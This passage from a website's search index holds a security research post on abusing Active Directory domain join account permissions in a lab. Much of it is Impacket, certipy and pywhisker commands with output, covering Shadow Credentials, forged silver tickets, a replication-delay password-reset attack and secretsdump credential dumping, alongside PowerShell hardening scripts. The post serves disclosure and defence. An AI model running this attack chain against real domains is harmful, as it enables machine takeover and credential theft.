SDDL on computer objects (OA;;WP;4c164200-20c0-11d0-a768-00aa006e0529;;CO):\nField Meaning (OA;;...;;;CO) Object-specific Allow ACE applying to Creator Owner WP Write Property — grants permission to modify properties within the specified property set 4c164200-20c0-11d0-a768-00aa006e0529 GUID for “Account Restrictions” property set — includes attributes like userAccountControl, accountExpires, pwdLastSet, etc. CO Creator Owner — the security principal that created the object Yet again we do not want to change the default setup of ACLs in Active Directory so we apply the Deny-approach:\n# ---- SETTINGS ---- $entity = \u0026#34;domainjoin\u0026#34; $guid = \u0026#34;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79\u0026#34; # Write msDS-AllowedToActOnBehalfOfOtherIdentity $property = \u0026#34;WriteProperty\u0026#34; $permission = \u0026#34;Deny\u0026#34; # ------------------- # Define the ACE properties $adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property $objectType = New-Object Guid $guid # GUID for the specific property $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None $accessControlType = [System.Security.AccessControl.AccessControlType]::$permission $identityReference = New-Object System.Security.Principal.NTAccount($entity) # Create the ACE $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType) # Get ALL computer objects in the forest root domain and apply the deny $computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName foreach($computer in $computerDNs){ # Get the current ACL of the computer object $acl = Get-ACL \u0026#34;AD:$computer\u0026#34; # Add the new ACE to the ACL $acl.AddAccessRule($ace) # Set the modified ACL back to the computer object Set-ACL -Path \u0026#34;AD:$computer\u0026#34; -AclObject $acl } And we\u0026rsquo;ll test it out:\nuser@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200 Type help for list of commands # set_rbcd DEMOMACHINE$ RBCD$ Found Target DN: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local Target SID: S-1-5-21-801220465-3856247095-653829165-1182 Found Grantee DN: CN=RBCD,CN=Computers,DC=test,DC=local Grantee SID: S-1-5-21-801220465-3856247095-653829165-1205 Currently allowed sids: (\u0026#39;Could not modify object, the server reports insufficient rights: %s\u0026#39;, \u0026#39;00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\\n\\x00\u0026#39;) [-] (\u0026#39;Could not modify object, the server reports insufficient rights: %s\u0026#39;, \u0026#39;00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\\n\\x00\u0026#39;) There we go - we have now mitigated the usage of the RBCD attack on a computer account with the domain join account. Happy times.\nChange password Change password, compared to reset password requires knowledge of the current password. The following example shows password change by knowing the current NTLM hash:\nuser@adpen1:~$ changepasswd.py test.local/DEMOMACHINE\\$@test.local -hashes 687f3a9249b598f608261f56ef2b36e6 -newhash 687f3a9249b598f608261f56ef2b36e5 Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [*] Changing the password of test.local\\DEMOMACHINE$ [*] Connecting to DCE/RPC as test.local\\DEMOMACHINE$ [*] Password was changed successfully. [!] User might need to change their password at next logon because we set hashes (unless password never expires is set). No exploitation of the ACE was found, meaning no mitigation is needed.\nReset password Easy compromise one might think. Reset password, take over the machine, game over, profit, etc. But no.\nThe reason for this ACE assignment is sane. In order to rejoin/reinstall a machine the domain join account needs the ability to set new passwords for the machine account.\nFirst off, reset password, compared to change password, does not require the user to know the current password:\nuser@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\\$ -no-add Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [*] Successfully set password of DEMOMACHINE$ to T9ArZbsCrgxopEPGLBfv4ctcb490RWxL. The problem that arises when we attempt to exploit this is that we have now broken the trust relationship between the computer and Active Directory as the password in AD is no longer in sync with the device:\nIn order to not bork every client we attack this relationship must somehow be repaired.\nBut, focusing on the positives, we have control over the password stored in the Active Directory - however the password on the local machine is still the initial automatically generated 120 character password. The password from Active Directory will not be replicated to the local machine, as the process for syncing local machine account passwords is:\nThe computer generates a new random password It authenticates to a domain controller using its current password It sends the new password to the DC The DC updates the password in Active Directory The computer stores the new password locally in its LSA (Local Security Authority) secrets This occurs by default with an interval of 30 days.\nThis is nicely explained by @syfuhs (https://syfuhs.net/on-computer-passwords.\nThe fact remains that we have the Active Directory stored password. So in theory, with ticketer.py, we should be able to generate a valid Kerberos Service Ticket and use it to compromise the target machine, even though the trust relationship is broken. This is because ticketer.py forges the Service Ticket offline (without ever talking to the domain controller), by using the NTLM hash of the target\u0026rsquo;s machine account password.\nBut this will never work, as we haven\u0026rsquo;t yet compromised the machine meaning that we have no knowledge of the locally stored computer account password. I.e., the machine will not be able to decrypt our forged ticket.\nThe previous assumption is validated with the following steps:\nuser@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\\$ -no-add -computer-pass Password123 Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [*] Successfully set password of DEMOMACHINE$ to Password123. user@adpen1:~$ ticketer.py -nthash 58a478135a93ac3bf058a5ea0e8fdb71 -domain-sid S-1-5-21-801220465-3856247095-653829165 -user-id 1103 -domain test.local -spn \u0026#39;CIFS/DEMOMACHINE\u0026#39; test-admin Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for test.local/test-admin [*] PAC_LOGON_INFO [*] PAC_CLIENT_INFO_TYPE [*] EncTicketPart [*] EncTGSRepPart [*] Signing/Encrypting final ticket [*] PAC_SERVER_CHECKSUM [*] PAC_PRIVSVR_CHECKSUM [*] EncTicketPart [*] EncTGSRepPart [*] Saving ticket in test-admin.ccache Ticket cache: FILE:/home/user/test-admin.ccache user@adpen1:~$ KRB5CCNAME=~/test-admin.ccache secretsdump.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k -debug Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies [+] Impacket Library Installation Path: /home/user/.local/share/pipx/venvs/impacket/lib/python3.11/site-packages/impacket [+] Using Kerberos Cache: /home/user/test-admin.ccache [+] Domain retrieved from CCache: TEST.LOCAL [+] Returning cached credential for CIFS/DEMOMACHINE@TEST.LOCAL [+] Using TGS from cache [+] Username retrieved from CCache: test-admin [-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete. At the moment, Reset password seems to be a dead-end, only resulting in denial of service.\nNo mitigating actions needed here as we want to keep Reset password ACE in order to reinstall machines.\nWrite msDS-KeyCredentialLink attribute - Shadow Credentials Shadow Credentials, a.k.a, the ability to write certificates to the msDS-KeyCredentialLink attribute in the computer object and then PKINIT your way to compromising the machine has many similarities with RBCD.\nThere is no ACL provided by default that gives our domain join account the necessary permission to perform this attack as seen in the following codebox:\npywhisker -t DEMOMACHINE\\$ -u domainjoin -p $PASS -d test.local -a add [*] Searching for the target account [*] Target user found: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: ea09751f-61a4-ff19-81d9-4c762d24a480 [*] Updating the msDS-KeyCredentialLink attribute of DEMOMACHINE$ [!] Could not modify object, the server reports insufficient rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0 But as the legitimate usage for msDS-KeyCredentialLink is to enable Windows Hello for Business where a user can login with PIN or biometrics instead of a password someone needs to be able to write to this attribute?\nTo enable this login method the computer account must be able to write on its own attributes i.e. SELF:\nuser@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local | grep -i DS_VA 035. \u0026#39;SELF\u0026#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER (inherited from the LDAP Attribute computer) 061. \u0026#39;TEST.LOCAL\\Domain Admins\u0026#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER 062. \u0026#39;Creator Owner\u0026#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER (inherited from the LDAP Attribute computer) So if we circle back to Reset password. Using this permission we will be able to obtain the SELF permission allowing us DS_VALIDATED_WRITE_COMPUTER (Validated write to computer attributes).\nSo:\nReset password of our target Use the computer account (SELF) to write msDS-KeyCredentialLink Exchange our PFX for a Kerberos TGT Access our target with for instance smbclient.py user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\\$ -no-add -computer-pass Password123 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Successfully set password of NEWCOMPUTER2$ to Password123. user@adpen1:~$ pywhisker -t DEMOMACHINE\\$ -u DEMOMACHINE\\$ -p $PASS -d test.local -a add; [*] Searching for the target account [*] Target user found: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 19215246-f8b6-1747-5b49-8e75a5e68630 [*] Updating the msDS-KeyCredentialLink attribute of DEMOMACHINE$ [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: a6xwbwfv.pfx [+] PFX exportiert nach: a6xwbwfv.pfx [i] Passwort f?r PFX: 1Rlwc5Mw6epUx31y0i6j [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: a6xwbwfv.pfx [*] Must be used with password: 1Rlwc5Mw6epUx31y0i6j [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools user@adpen1:~$ certipy auth -pfx a6xwbwfv.pfx -password 1Rlwc5Mw6epUx31y0i6j -username DEMOMACHINE\\$ -domain test.local -dc-ip 100.64.5.200 Certipy v5.0.1 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] No identities found in this certificate [!] Could not find identity in the provided certificate [*] Using principal: \u0026#39;demomachine$@test.local\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;demomachine$\u0026#39; [*] Got hash for \u0026#39;demomachine$@test.local\u0026#39;: aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 user@adpen1:~$ KRB5CCNAME=~/demomachine.ccache smbclient.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete. Once again. Similar issue as with RBCD and Silver Tickets. We have a discrepancy with the machine account password on the local client and Active Directory meaning our forged ticket results in a 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED and is not accepted.\nNow, what differs Shadow Credentials from RBCD and Silver Tickets is that you forge a Kerberos Service Ticket (ST) encrypted with a NTLM hash - With Shadow Credentials we use PKINIT to exchange a public key pair for a Kerberos Ticket Granting Ticket (TGT), which then is used to issue Service Tickets (ST).\nThis means that, should the relationship between the target and the domain be repaired, the target would be able to validate the Kerberos Service Ticket:\nAnd then accessing the target with smbclient.py the attack will succeed:\nuser@adpen1:~$ KRB5CCNAME=~/demomachine.ccache smbclient.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Type help for list of commands # shares ADMIN$ C$ IPC$ Yay?\nSo in theory, if we perform this attack 1 day prior to the machine account expiration in Active Directory we could maybe break the trust and gain our TGT, and then allow the machine to self repair.\nNot so fast. Because in order to repair the relationship the following two statements needs to be satisfied:\nLocal admin/Local system privileges on the machine to change passwords in LSA In a normal, automatic scenario this is done by the Netlogon service An account with reset password on the computer object in active directory In a normal, automatic scenario this permission is made up of the local machine account NTLM authentication The computer\u0026rsquo;s automatic repair function lacks the second requirement because the password in Active Directory has been changed and the authentication will not succeed.\nThis attack as well is a dead end.\nFor the sake of demonstration, the trust can be repaired by opening an elevated command prompt on the broken machine and executing the following command with an account allowed to Reset password on the machine account where the command is executed:\nnetdom resetpwd /Server:DC01 /UserD:domainjoin /PasswordD:-password- But this is out of our control.\nAD CS computer certificate How about using straight up AD CS to exchange a certificate for a TGT?\nuser@adpen1:~$ certipy req -username DEMOMACHINE\\$@test.local -password $PASS -ca test-CA01-CA -ns 100.64.5.200 -template Computer2 -dc-ip 100.64.5.200 -target ca01.test.local -upn DEMOMACHINE\\$ -sid S-1-5-21-801220465-3856247095-653829165-1215 Certipy v5.0.1 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 35 [*] Successfully requested certificate [*] Got certificate with UPN \u0026#39;DEMOMACHINE$\u0026#39; [*] Certificate object SID is \u0026#39;S-1-5-21-801220465-3856247095-653829165-1215\u0026#39; [*] Saving certificate and private key to \u0026#39;demomachine.pfx\u0026#39; [*] Wrote certificate and private key to \u0026#39;demomachine.pfx\u0026#39; user@adpen1:~$ certipy auth -pfx demomachine.pfx -dc-ip 100.64.5.200 -domain test.local -username DEMOMACHINE\\$ Certipy v5.0.1 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: \u0026#39;DEMOMACHINE$\u0026#39; [*] SAN URL SID: \u0026#39;S-1-5-21-801220465-3856247095-653829165-1215\u0026#39; [*] Using principal: \u0026#39;demomachine$@test.local\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;demomachine$\u0026#39; [*] Got hash for \u0026#39;demomachine$@test.local\u0026#39;: aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 user@adpen1:~$ KRB5CCNAME=~/demomachine.ccache smbclient.py DEMOMACHINE -no-pass -k -target-ip 100.64.5.212 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete. Same issue as with Shadow Credentials - the trust is broken.\nFinally success (Reset password revisited) After all these attempts there was not a single instance where we successfully compromised the target without breaking the trust. While feeling a bit low, a message was sent to a former colleague and awesome Windows hacker Jonas Vestberg (@bugch3ck) to discuss ideas.\nWhat this chat ended with was the idea of abusing replication delays in Active Directory sites and if these could be abused to get ahold the prior password before reset by using PKINIT. From experience of being a Windows SysAdm this reminded me about some old problems where different Active Directory sites could be out-of-sync when creating new accounts in a remote site, and the lowest threshold for sync was 15 minutes. An exception to this 15 minutes replication windows is Bad Password Count which always is incremented and verified against the PDC (Primary Domain Controller) so nobody could password guess an account N time number-of-domain-controllers before lockout.\nAfter brewing a cappuccino the task was set to expand the test environment with a DC02.\nA new, Default-Second-Site-Name was created and the secondary DC was assigned to this site:\nAnd thank you nightmares for helping me remember the 15 minutes sync schedule:\nSo, first off, let\u0026rsquo;s check that our target has its password replicated. This is done with DCSync with a domain admin account against each DC:\nuser@adpen1:~$ secretsdump.py test.local/administrator:$DAPW@100.64.5.200 | grep DEMOMACHINE\\$:1215; secretsdump.py test.local/administrator:$DAPW@100.64.55.200 | grep DEMOMACHINE\\$:1215 DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06::: DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06::: Awesome. We have sync and we have made sure our machine\u0026rsquo;s trust relationship is working.\nWhat we do next is to reset the DEMOMACHINE$ password on DC01 (100.64.5.200) with our domain join account:\nuser@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\\$ -no-add -computer-pass Password123 -dc-ip 100.64.5.200 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Successfully set password of DEMOMACHINE$ to Password123. And now we have broken the trust between DEMOMACHINE$ and DC01 but the password has not yet replicated to DC02:\nuser@adpen1:~$ secretsdump.py test.local/administrator:$DAPW@100.64.5.200 | grep DEMOMACHINE\\$:1215; secretsdump.py test.local/administrator:$DAPW@100.64.55.200 | grep DEMOMACHINE\\$:1215 DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71::: DEMOMACHINE$:1215:aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06::: This however contradicts what Steve Syfuhs writes in his blog post about computer account passwords:\nWe will now turn to AD CS and request a certificate for our machine account with our newly set password:\nuser@adpen1:~$ certipy req -username DEMOMACHINE\\$@test.local -password Password123 -ca test-CA01-CA -ns 100.64.5.200 -template Computer2 -dc-ip 100.64.5.200 -target ca01.test.local -upn DEMOMACHINE\\$ -sid S-1-5-21-801220465-3856247095-653829165-1215 Certipy v5.0.1 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 39 [*] Successfully requested certificate [*] Got certificate with UPN \u0026#39;DEMOMACHINE$\u0026#39; [*] Certificate object SID is \u0026#39;S-1-5-21-801220465-3856247095-653829165-1215\u0026#39; [*] Saving certificate and private key to \u0026#39;demomachine.pfx\u0026#39; [*] Wrote certificate and private key to \u0026#39;demomachine.pfx\u0026#39; Now we\u0026rsquo;ll exchange the certificate for a Kerberos TGT via iPKINIT. We can obtain the NTLM hash of the account as we can decrypt the ticket with the AES key. This is automated in certipy auth:\nuser@adpen1:~$ certipy auth -pfx demomachine.pfx -dc-ip 100.64.5.200 -domain test.local -username DEMOMACHINE\\$ Certipy v5.0.1 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: \u0026#39;DEMOMACHINE$\u0026#39; [*] SAN URL SID: \u0026#39;S-1-5-21-801220465-3856247095-653829165-1215\u0026#39; [*] Using principal: \u0026#39;demomachine$@test.local\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;demomachine$\u0026#39; [*] Got hash for \u0026#39;demomachine$@test.local\u0026#39;: aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 Yes we receive the NTLM hash that we initially set: 58a478135a93ac3bf058a5ea0e8fdb71 (a.k.a Password123)\nIf we now however turn to DC02 - what hash will we obtain?\nuser@adpen1:~$ certipy auth -pfx demomachine.pfx -dc-ip 100.64.55.200 -domain test.local -username DEMOMACHINE\\$ Certipy v5.0.1 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: \u0026#39;DEMOMACHINE$\u0026#39; [*] SAN URL SID: \u0026#39;S-1-5-21-801220465-3856247095-653829165-1215\u0026#39; [*] Using principal: \u0026#39;demomachine$@test.local\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;demomachine.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;demomachine$\u0026#39; [*] Got hash for \u0026#39;demomachine$@test.local\u0026#39;: aad3b435b51404eeaad3b435b51404ee:08730b1c9e9b033c5aa8eda12db7da06 SCORE! We now have obtain the initial machine account password that we previously did not know: 08730b1c9e9b033c5aa8eda12db7da06\nNow we\u0026rsquo;ll restore the trust:\nuser@adpen1:~$ changepasswd.py test.local/DEMOMACHINE\\$:Password123@test.local -newhashes 08730b1c9e9b033c5aa8eda12db7da06:08730b1c9e9b033c5aa8eda12db7da06 -dc-ip 100.64.5.200 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Changing the password of test.local\\DEMOMACHINE$ [*] Connecting to DCE/RPC as test.local\\DEMOMACHINE$ [*] Password was changed successfully. [!] User will need to change their password on next logging because we are using hashes. And create our Silver Ticket to compromise the target:\nuser@adpen1:~$ ticketer.py -nthash 08730b1c9e9b033c5aa8eda12db7da06 -domain-sid S-1-5-21-801220465-3856247095-653829165 -user-id 1103 -domain test.local -spn \u0026#39;CIFS/DEMOMACHINE\u0026#39; test-admin Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for test.local/test-admin [*] PAC_LOGON_INFO [*] PAC_CLIENT_INFO_TYPE [*] EncTicketPart [*] EncTGSRepPart [*] Signing/Encrypting final ticket [*] PAC_SERVER_CHECKSUM [*] PAC_PRIVSVR_CHECKSUM [*] EncTicketPart [*] EncTGSRepPart [*] Saving ticket in test-admin.ccache user@adpen1:~$ KRB5CCNAME=~/test-admin.ccache secretsdump.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x8e0ddbb9e9d348123a2d025c3253ee03 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) [...] Yay! This actually worked.. So in summary\nThe requirements for this attack to work include access to a domain join account with Reset password on a target computer object. In addition an Active Directory Certificate Server which is able to generate Computer certificates. This is very common as this is basically what allows companies to run certificate based enterprise WLAN\u0026rsquo;s. Additionally more than one Active Directory site is needed in order to have a 15 minute windows of replication time.\nEnough shenanigans for now. Let\u0026rsquo;s attempt to wrap up this article together with all mitigations we have set for our domain join account..\nSummary So we reviewed a lot of ACEs and learned a lot about Active Directory ACEs, inheritance, default SDDL and precedence.\nWe have shown how we could abuse default permissions assigned to our domain join account to perform Read Legacy-LAPS, RBCD, Shadow Credentials and finally managed to exploit Reset password without breaking machine trust.\nIt should also be noted that Reset password abuse comes without any mitigation if the ability to reinstall a machine with SCCM is to remain possible.\nMitigations The recommendation shown on Microsoft\u0026rsquo;s web site creates an over-privileged domain join account which if obtained by an attacker, can be used to compromise all machines which it has joined to the domain.\nPermission Type Notes Exploitable Read all properties Read Full read access to object attributes Yes Change password Modify User can change their own password No Reset password Modify Administrative password reset capability Yes Read and Write account restrictions Modify Write attributes Yes Validated write to DNS host name Validated Write Controlled DNS hostname modification Not reviewed Validated write to service principal name Validated Write Controlled SPN modification Not reviewed Allowed to authenticate Security Permission to authenticate to the domain Not Reviewed Write computername (pre-Windows 2000) Write Legacy computer name attribute Not Reviewed Write description Write Description attribute No The following steps provide a hardened environment, where no known compromise can be performed from the perspective of the domain join account:\nDisable arbitrary users to create computer accounts Set-ADDomain -Identity test.local -Replace @{ \u0026#39;ms-DS-MachineAccountQuota\u0026#39; = 0 } -Verbose Change the owner from domain join to Domain Admins on all computers (Needs recurring run): $domain=\u0026#34;TEST\u0026#34; $comps = Get-ADComputer -filter * foreach($comp in $comps){ $comppath = \u0026#34;AD:$($comp.DistinguishedName.ToString())\u0026#34; $acl = Get-Acl -Path $comppath $objUser = New-Object System.Security.Principal.NTAccount($domain, \u0026#34;Domain Admins\u0026#34;) $acl.SetOwner($objUser) Set-Acl -Path $comppath -AclObject $acl } Allow domain join account to Create and Delete computer objects only in specific OUs: # ---- SETTINGS ---- $ouDN = \u0026#34;OU=Workstations,DC=test,DC=local\u0026#34; $entity = \u0026#34;domainjoin\u0026#34; $permission = \u0026#34;Allow\u0026#34; # ------------------ # Get the schemaIDGUID for the \u0026#39;computer\u0026#39; class (object-specific ACE) $schemaNC = (Get-ADRootDSE).schemaNamingContext $computerClass = Get-ADObject -SearchBase $schemaNC -LDAPFilter \u0026#34;(lDAPDisplayName=computer)\u0026#34; -Properties schemaIDGUID $guid = [Guid]$computerClass.schemaIDGUID # ACE: Allow CreateChild + DeleteChild for the \u0026#39;computer\u0026#39; class $adRights = [System.DirectoryServices.ActiveDirectoryRights]::CreateChild -bor [System.DirectoryServices.ActiveDirectoryRights]::DeleteChild $objectType = $guid $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All $accessControlType = [System.Security.AccessControl.AccessControlType]::$permission $identityReference = New-Object System.Security.Principal.NTAccount($entity) $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType) # Apply to the OU $acl = Get-ACL \u0026#34;AD:$ouDN\u0026#34; $acl.AddAccessRule($ace) Set-ACL -Path \u0026#34;AD:$ouDN\u0026#34; -AclObject $acl Deny domain join Legacy-LAPS read access on all computers (Needs recurring run): # ---- SETTINGS ---- $entity = \u0026#34;domainjoin\u0026#34; $guid = \u0026#34;ad27bc2b-cf04-424d-b705-5df50c7d5d37\u0026#34; # ms-Mcs-AdmPwd $property = \u0026#34;ReadProperty\u0026#34; $permission = \u0026#34;Deny\u0026#34; # ------------------- # Define the ACE properties $adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property $objectType = New-Object Guid $guid # GUID for the specific property $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None $accessControlType = [System.Security.AccessControl.AccessControlType]::$permission $identityReference = New-Object System.Security.Principal.NTAccount($entity) # Create the ACE $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType) # Get ALL computer objects in the forest root domain and apply the deny $computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName foreach($computer in $computerDNs){ # Get the current ACL of the computer object $acl = Get-ACL \u0026#34;AD:$computer\u0026#34; # Add the new ACE to the ACL $acl.AddAccessRule($ace) # Set the modified ACL back to the computer object Set-ACL -Path \u0026#34;AD:$computer\u0026#34; -AclObject $acl } Deny domain join RBCD actions (Need recurring run): # ---- SETTINGS ---- $entity = \u0026#34;domainjoin\u0026#34; $guid = \u0026#34;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79\u0026#34; # Write msDS-AllowedToActOnBehalfOfOtherIdentity $property = \u0026#34;WriteProperty\u0026#34; $permission = \u0026#34;Deny\u0026#34; # ------------------- # Define the ACE properties $adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property $objectType = New-Object Guid $guid # GUID for the specific property $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None $accessControlType = [System.Security.AccessControl.AccessControlType]::$permission $identityReference = New-Object System.Security.Principal.NTAccount($entity) # Create the ACE $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType) # Get ALL computer objects in the forest root domain and apply the deny $computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName foreach($computer in $computerDNs){ # Get the current ACL of the computer object $acl = Get-ACL \u0026#34;AD:$computer\u0026#34; # Add the new ACE to the ACL $acl.AddAccessRule($ace) # Set the modified ACL back to the computer object Set-ACL -Path \u0026#34;AD:$computer\u0026#34; -AclObject $acl } Deny Reset password for domain join (Need recurring run and breaks the ability to rejoin a machine with domain join account): # ---- SETTINGS ---- $entity = \u0026#34;domainjoin\u0026#34; $guid = \u0026#34;00299570-246d-11d0-a768-00aa006e0529\u0026#34; # Extended right GUID for \u0026#34;Reset Password\u0026#34; $property = \u0026#34;ExtendedRight\u0026#34; $permission = \u0026#34;Deny\u0026#34; # ------------------- # Define the ACE properties (template style) $adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property $objectType = New-Object Guid $guid # GUID for the specific property $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None # this object only $accessControlType = [System.Security.AccessControl.AccessControlType]::$permission $identityReference = New-Object System.Security.Principal.NTAccount($entity) # Create the ACE $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType) # Get ALL computer objects in the forest root domain and apply the deny $computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName foreach($computer in $computerDNs){ $acl = Get-ACL \u0026#34;AD:$computer\u0026#34; $acl.AddAccessRule($ace) Set-ACL -Path \u0026#34;AD:$computer\u0026#34; -AclObject $acl } Ending words In the middle of writing this research post SpecterOps (Garrett Foster) publicised similar findings which also touches Reset password, Write Account Restrictions and Microsoft domain join account permission. Feeling a bit down over the fact that our research partly overlapped my spirits were lifted when me and Garrett sat down in a 75 minute screen sharing session exchanging and discussing notes from our research. Really nice guy and very happy to have met him.\nAnd shout-out to Jonas Vestberg for dropping the idea of replication delays!\nFollow us on LinkedIn (https://linkedin.com/company/shelltrail) for more cybersecurity related content,\nCheers\n","date":1759881600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1759881600,"objectID":"71ed9c2cd1c95f8f9fe54d6e46be6e87","permalink":"https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/","publishdate":"2025-10-08T00:00:00Z","relpermalink":"/research/active-directory-domain-ownjoin-accounts-revisited/","section":"research","summary":"The post walks through the usage and the security considerations of domain join accounts used in Active Directory","tags":null,"title":"Active Directory domain (join)own accounts revisited 2025","type":"research"},{"authors":null,"categories":null,"content":"Robin has had a big interest in cyber security as long as he remembers. Apart from breaking systems and reporting vulnerabilites to companies, he has been playing CTFs in multiple high-ranking competitions, representing both his country Sweden and other teams.\nCertifications:\nOffensive Security Certified Professional (OSCP) ","date":1754524800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1754524800,"objectID":"e1b2c34c875ab1c77ba087aa47866523","permalink":"https://www.shelltrail.com/employees/robin/","publishdate":"2025-08-07T00:00:00Z","relpermalink":"/employees/robin/","section":"employees","summary":"IT Security 